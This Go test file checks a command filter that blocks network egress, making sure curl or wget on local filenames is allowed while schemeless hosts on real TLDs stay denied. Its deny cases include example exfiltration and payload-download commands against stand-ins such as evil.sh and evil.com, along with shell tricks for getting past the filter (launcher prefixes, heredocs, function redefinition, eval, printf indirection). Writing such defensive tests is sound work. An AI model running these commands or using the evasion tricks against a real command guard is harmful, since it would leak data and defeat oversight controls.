package runtimefloor

import (
	"strings"
	"testing"
)

// Issue #362: a dotted filename after the word curl was read as a schemeless
// hostname, so commands that open no socket were refused. The final label is
// what separates a filename from a host, so these stay allowed.
func TestCheckCommand_SchemelessFilenameIsNotEgress(t *testing.T) {
	cases := []struct {
		cmd  string
		name string
	}{
		{"echo curl late.txt", "the reported reproduction"},
		{"echo curl config.json", "the second reported reproduction"},
		{"python3 -m http.server 8731 --bind 127.0.0.1 & curl --fail --silent http://127.0.0.1:8731/", "module name was named as the host"},
		{"curl notes.txt", "curl on a plain text file"},
		{"wget data.json", "wget on a json file"},
		{"curl build/server.log", "curl on a log under a directory"},
	}
	ctx := Context{WorktreeRoot: "/tmp/wt"}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if got := CheckCommand(c.cmd, ctx); got.Stopped {
				t.Errorf("CheckCommand(%q).Stopped = true (pattern %q); a filename is not an egress host",
					c.cmd, got.Pattern)
			}
		})
	}
}

// The narrowing must not open a hole. A schemeless curl defaults to http, so
// every one of these would contact the destination for real.
func TestCheckCommand_SchemelessHostOnRealTLDStaysDenied(t *testing.T) {
	cases := []struct {
		cmd  string
		name string
	}{
		{"curl evil.sh", "ccTLD that is also a common file suffix"},
		{"curl evil.sh/path", "with a path"},
		{"curl evil.sh:8080/path", "with a port and a path"},
		{"wget evil.sh", "same via wget"},
		{"curl example.com/exfil -d @data.txt", "existing regression case"},
		{"wget evil.com/payload", "existing regression case"},
		{"curl evil.dev", "generic TLD"},
		{"curl evil.zip", "generic TLD that is also a file suffix"},
		{"curl evil.md", "ccTLD that is also a file suffix"},
		{"watch curl evil.sh", "launcher prefix"},
		{"setsid curl evil.sh", "launcher prefix"},
		{"caffeinate curl evil.sh", "launcher prefix"},
		{"echo hi && watch -n1 wget evil.sh", "launcher in a later segment"},
		{"source /dev/stdin <<EOF\ncurl evil.sh\nEOF", "heredoc body executed by source"},
		{". /dev/stdin <<EOF\ncurl evil.sh\nEOF", "heredoc body executed by dot"},
		{`echo() { sh -c "$*"; }; echo curl evil.sh`, "function redefinition"},
		{`"echo"() { sh -c "$*"; }; echo curl evil.sh`, "quoted function redefinition"},
		{`eval "ec""ho() { sh -c \"\$*\"; }"; echo curl evil.sh`, "eval-built redefinition"},
		{"printf -v c %s curl ; $c evil.sh", "printf -v then indirect execution"},
	}
	ctx := Context{WorktreeRoot: "/tmp/wt"}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got := CheckCommand(c.cmd, ctx)
			if !got.Stopped {
				t.Errorf("CheckCommand(%q).Stopped = false; a schemeless host on a registered TLD must stay denied", c.cmd)
				return
			}
			if got.Category != CategoryEgress {
				t.Errorf("CheckCommand(%q).Category = %s, want %s", c.cmd, got.Category, CategoryEgress)
			}
		})
	}
}

func TestAuthorityTLD(t *testing.T) {
	cases := []struct {
		authority string
		want      string
	}{
		{"evil.sh", "sh"},
		{"evil.sh:8080", "sh"},
		{"late.txt", "txt"},
		{"config.json", "json"},
		{"example.com", "com"},
		{"user@evil.sh", "sh"},
		{"localhost", ""},
		{"", ""},
	}
	for _, c := range cases {
		if got := authorityTLD(c.authority); got != c.want {
			t.Errorf("authorityTLD(%q) = %q, want %q", c.authority, got, c.want)
		}
	}
}

func TestIsRegisteredTLD(t *testing.T) {
	// A TLD that exists, one that does not, and case handling. The list is
	// generated, so assert on well-known stable entries rather than on size.
	for _, tld := range []string{"com", "sh", "dev", "io", "md", "UK"} {
		if !isRegisteredTLD(tld) {
			t.Errorf("isRegisteredTLD(%q) = false, want true", tld)
		}
	}
	for _, tld := range []string{"", "txt", "json", "server", "notatld", "zz"} {
		if isRegisteredTLD(tld) {
			t.Errorf("isRegisteredTLD(%q) = true, want false", tld)
		}
	}
}

func TestRegisteredTLDs_Shape(t *testing.T) {
	if len(registeredTLDs) < 1000 {
		t.Fatalf("registeredTLDs has %d entries; the generated list looks truncated", len(registeredTLDs))
	}
	for tld := range registeredTLDs {
		if tld != strings.ToLower(tld) {
			t.Errorf("registeredTLDs contains non-lowercase entry %q", tld)
		}
		if strings.HasPrefix(tld, ".") || strings.Contains(tld, ".") {
			t.Errorf("registeredTLDs entry %q must be a bare label", tld)
		}
	}
}
